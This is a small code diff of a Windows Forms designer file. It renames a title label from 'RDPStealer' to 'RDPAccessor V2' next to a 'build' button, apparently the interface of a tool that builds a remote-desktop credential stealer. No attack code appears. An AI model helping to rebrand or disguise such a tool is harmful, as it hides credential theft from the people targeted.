@@ -209,9 +209,9 @@
             this.label1.ForeColor = System.Drawing.Color.White;
             this.label1.Location = new System.Drawing.Point(55, 20);
             this.label1.Name = "label1";
-            this.label1.Size = new System.Drawing.Size(81, 19);
+            this.label1.Size = new System.Drawing.Size(114, 19);
             this.label1.TabIndex = 6;
-            this.label1.Text = "RDPStealer";
+            this.label1.Text = "RDPAccessor V2";
             // 
             // buildBtn
             // 
